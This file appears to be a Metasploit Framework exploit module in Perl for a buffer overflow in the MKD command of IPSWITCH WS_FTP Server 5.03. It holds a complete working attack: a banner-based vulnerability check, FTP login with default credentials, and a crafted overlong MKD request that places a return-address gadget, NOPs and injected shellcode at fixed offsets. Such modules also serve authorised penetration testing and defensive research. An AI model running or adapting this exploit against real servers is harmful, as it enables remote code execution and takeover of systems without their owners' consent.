##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wsftp_server_503_mkd;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
  {
	'Name'  => 'WS-FTP Server 5.03 MKD Overflow',
	'Version'  => '$Revision: 1.2 $',
	
	'Authors' =>
	  [ 'ET LoWNOISE <et [at] cyberspace.org>',
		'Reed Arvin <reedarvin [at] gmail.com>'
	  ],
	
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 0,
	
	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
		'USER'  => [1, 'DATA', 'Username', 'ftp'],
		'PASS'  => [1, 'DATA', 'Password', 'ftp'],
	  },

	'Payload' =>
	  {
		'Space'  => 480,
		'BadChars'  => "\x00~+&=%\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e",
		'Prepend'	=> "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys' 		=> ['+ws2ord'],
	  },

	'Description'  =>  Pex::Text::Freeform(qq{

        This module exploits the buffer overflow found in the MKD command
        in IPSWITCH WS_FTP Server 5.03 discovered by Reed Arvin.    
}),

	'Refs'  =>
	  [
	  	['BID', 11772],
	  ],
	  
	'DefaultTarget' => 0,
	'Targets' =>
	  [
	    # Address is executable to allow XP and 2K
		# 0x25185bb8 = push esp, ret (libeay32.dll)
		# B85B1825XX        mov eax,0xXX25185b
		['WS-FTP Server 5.03 Universal', 0x25185bb8 ],
	  ],
	  
	'Keys' => ['wsftp'],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my ($self) = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	my $res = $s->Recv(-1, 20);
	$s->Close();

	if ($res !~ /5\.0\.3/) {
		$self->PrintLine("[*] This server does not appear to be vulnerable.");
		return $self->CheckCode('Safe');
	}

	$self->PrintLine("[*] Vulnerable installation detected.");
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP module.");
		return;
	}

	my $request = Pex::Text::PatternCreate(8192);
	substr($request, 514, 4, pack('V', $target->[1]));
	substr($request, 518, 4, pack('V', $target->[1]));
	substr($request, 522, 2, $self->MakeNops(2));
	substr($request, 524, length($shellcode), $shellcode);

	# Not critical, but seems to keep buffer from getting mangled
	substr($request, 498, 4, pack('V', 0x7ffd3001));
	
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $r = $s->RecvLineMulti(20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	$s->Send("USER ".$self->GetVar('USER')."\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	$s->Send("PASS ".$self->GetVar('PASS')."\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	$s->Send("MKD $request\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	sleep(2);
	return;
}
